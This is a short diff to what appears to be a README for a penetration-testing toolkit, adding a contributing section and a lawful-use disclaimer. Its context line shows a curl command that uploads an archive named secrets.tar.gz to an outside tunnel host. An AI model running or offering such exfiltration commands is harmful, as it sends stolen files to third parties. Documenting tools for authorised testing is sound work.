@@ -223,4 +223,11 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 
 ---
 
-> Contributions and suggestions are welcome!
+## 🙌 Contributing
+Pull requests are welcome! If you'd like to contribute tools or improvements, feel free to fork and submit a PR.
+
+📣 Disclaimer
+
+This tool is provided as-is for educational and lawful bug hunting and penetration testing purposes. Use it responsibly and only on systems you own or have explicit permission to test.
+
+ 
